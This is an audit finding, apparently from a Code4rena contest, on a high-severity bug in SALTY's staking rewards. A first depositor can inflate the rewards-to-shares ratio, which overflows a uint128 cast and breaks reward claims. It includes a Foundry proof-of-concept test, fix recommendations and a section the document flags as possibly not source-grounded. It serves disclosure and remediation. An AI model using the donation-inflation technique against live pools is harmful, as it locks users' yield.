---
id: 20674
severity: "High"
---

# First depositor can break staking-rewards accounting

## Description

Staking in SALTY pools happens automatically when adding liquidity. In order to track the accrued rewards, the code “simulates” the amount of virtual rewards that need to be added given the increase of shares and lend this amount to the user. So, when computing the real rewards for a given user, the code will compute its rewards based on the `totalRewards` of the given pool minus the virtual rewards. The following code computes the virtual rewards for a user:

```solidity
uint256 virtualRewardsToAdd = Math.ceilDiv( totalRewards[poolID] * increaseShareAmount, existingTotalShares );
```

Basically, it aims to maintain the current ratio of `totalRewards` and `existingTotalShares`. The issue with this is that allows the first depositor to set the ratio too high by donating some SALT tokens to the contract. For example, consider the following values:

```solidity
uint256 virtualRewardsToAdd = Math.ceilDiv( 1000e18 * 200e18, 202 );
```

The returned value is in order of 39-40 digits. Which is beyond what 128 bits can represent:

```solidity
user.virtualRewards += uint128(virtualRewardsToAdd);
totalRewards[poolID] += uint128(virtualRewardsToAdd);
```

This will broke the reward computations. For a more concrete example look the PoC.

## Proof of Concept

The following coded PoC showcase an scenario where the first depositor set the `rewards / shares` ratio too high, causing the rewards system to get broken. Specifically, it shows how the sum of the claimable rewards for each user is greater than the SALT balance of the contract.

It should be pasted under `Staking/tests/StakingRewards.t.sol`.

```solidity
function testUserCanBrickRewards() public {
        vm.startPrank(DEPLOYER);
        // Alice is the first depositor to poolIDs[1] and she deposited the minimum amounts 101 and 101 of both tokens.
        // Hence, alice will get 202 shares.          
        stakingRewards.externalIncreaseUserShare(alice, poolIDs[1], 202, true);
        assertEq(stakingRewards.userShareForPool(alice, poolIDs[1]), 202);
        vm.stopPrank();
        
        // Alice adds 100 SALT as rewards to the pool.
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward(poolIDs[1], 100 ether);
        stakingRewards.addSALTRewards(addedRewards);

        // Bob deposits 100 DAI and 100 USDS he will receive (202 * 100e8) / 101 = 200e18 shares.
        vm.startPrank(DEPLOYER);
        stakingRewards.externalIncreaseUserShare(bob, poolIDs[1], 200e18, true);
        assertEq(stakingRewards.userShareForPool(bob, poolIDs[1]), 200e18);
        vm.stopPrank();

        // Charlie deposits 10000 DAI and 10000 USDS he will receive (202 * 10000e8) / 101 = 20000e18 shares.
        vm.startPrank(DEPLOYER);
        stakingRewards.externalIncreaseUserShare(charlie, poolIDs[1], 20000e18, true);
        assertEq(stakingRewards.userShareForPool(charlie, poolIDs[1]), 20000e18);
        vm.stopPrank();

        // Observe how virtual rewards are broken. 
        uint256 virtualRewardsAlice = stakingRewards.userVirtualRewardsForPool(alice, poolIDs[1]);
        uint256 virtualRewardsBob = stakingRewards.userVirtualRewardsForPool(bob, poolIDs[1]);
        uint256 virtualRewardsCharlie = stakingRewards.userVirtualRewardsForPool(charlie, poolIDs[1]);

        console.log("Alice virtual rewards %s", virtualRewardsAlice);
        console.log("Bob virtual rewards %s", virtualRewardsBob);
        console.log("Charlie virtual rewards %s", virtualRewardsCharlie);

        // Observe the amount of claimable rewards.
        uint256 aliceRewardAfter = stakingRewards.userRewardForPool(alice, poolIDs[1]);
        uint256 bobRewardAfter = stakingRewards.userRewardForPool(bob, poolIDs[1]);
        uint256 charlieRewardAfter = stakingRewards.userRewardForPool(charlie, poolIDs[1]);

        console.log("Alice rewards %s", aliceRewardAfter);
        console.log("Bob rewards %s", bobRewardAfter);
        console.log("Charlie rewards %s", charlieRewardAfter);

        // The sum of claimable rewards is greater than 1000e18 SALT.
        uint256 sumOfRewards = aliceRewardAfter + bobRewardAfter + charlieRewardAfter;  
        console.log("All rewards &s", sumOfRewards);

        bytes32[] memory poolIDs2;

        poolIDs2 = new bytes32[](1);

        poolIDs2[0] = poolIDs[1];

        // It reverts
        vm.expectRevert("ERC20: transfer amount exceeds balance");
        vm.startPrank(charlie);
        stakingRewards.claimAllRewards(poolIDs2);
        vm.stopPrank();
    }
```

## Recommendation

Some options:

  * Make the function `addRewards` in the `StakingRewards` contract permissioned. In this way, all rewards will need to go through the emitter first.
  * Do not let the first depositor to manipulate the initial ratio of rewards / share. It is possible for every pool to burn the initial 10000 shares and starts with an initial small amount of rewards, kind of simulating being the first depositor.

virtualRewards and userShare are now uint256 rather than uint128.

Fixed in: <https://github.com/othernet-global/salty-io/commit/5f79dc4f0db978202ab7da464b09bf08374ec618>

Considering that you could time this to break in the future and that it seems easily doable by an attacker on a new pool, High severity seems justified under “Loss of matured yield”.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from the way the SALTY staking contract calculates and stores virtual rewards for each user. When a user’s share amount increases, the contract computes a virtual reward amount using the formula virtualRewardsToAdd = Math.ceilDiv(totalRewards * increaseShareAmount, existingTotalShares). This value is then added to two state variables that are declared as uint128. Because the multiplication totalRewards * increaseShareAmount can easily exceed the 128‑bit limit, especially when the first depositor artificially inflates the totalRewards by sending a large amount of SALT tokens before any other shares exist, the resulting virtualRewardsToAdd overflows the uint128 range. The overflow is silent: the value is truncated when cast to uint128, corrupting the accounting of both the user’s virtual rewards and the pool’s totalRewards. As a consequence, the contract believes that far more rewards are owed than the actual SALT balance holds. When later users deposit and the contract attempts to distribute the inflated rewards, the claim function reverts with “ERC20: transfer amount exceeds balance”, effectively locking the rewards and causing a loss of matured yield. The bug is triggered on a newly created pool when the first depositor can set an excessively high rewards‑to‑shares ratio, either by donating a large amount of SALT or by exploiting the unrestricted addRewards function. All participants in the affected pool – liquidity providers, token holders and the protocol itself – are impacted because the UI may display large reward numbers while the underlying token balance is insufficient, leading to failed claims and user confusion. The issue was discovered during a Code4rena audit through logical analysis and a proof‑of‑concept test that demonstrated the sum of claimable rewards exceeding the contract’s SALT balance. It is hard to notice because the overflow does not throw an error at the point of calculation; only later, when a claim is attempted, does the contract revert. The problem belongs to the class of arithmetic overflow and unchecked casting bugs that break financial accounting invariants. To remediate, the contract should store virtual rewards and user shares using a 256‑bit type, enforce safe casting, and restrict the addRewards entry point so that the initial rewards‑to‑shares ratio cannot be manipulated by an arbitrary first depositor. Additionally, initializing pools with a minimal, non‑zero share count and a bounded reward amount would prevent the ratio from being set to an extreme value, preserving the integrity of reward distribution.
